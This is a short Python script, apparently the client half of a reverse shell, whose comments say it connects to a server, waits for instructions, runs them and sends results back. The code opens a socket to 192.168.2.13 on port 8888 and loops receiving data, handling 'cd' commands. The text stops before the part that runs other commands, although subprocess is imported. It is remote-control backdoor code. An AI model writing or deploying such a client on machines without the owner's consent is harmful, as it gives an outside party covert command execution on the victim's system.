# try to connect to the server
# wait for instructions
# receive instruction and run them
# take that result and send them back to the server

import socket
import os
import subprocess

s = socket.socket()
host = "192.168.2.13"
port = 8888  # same as the port in server.py

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
        
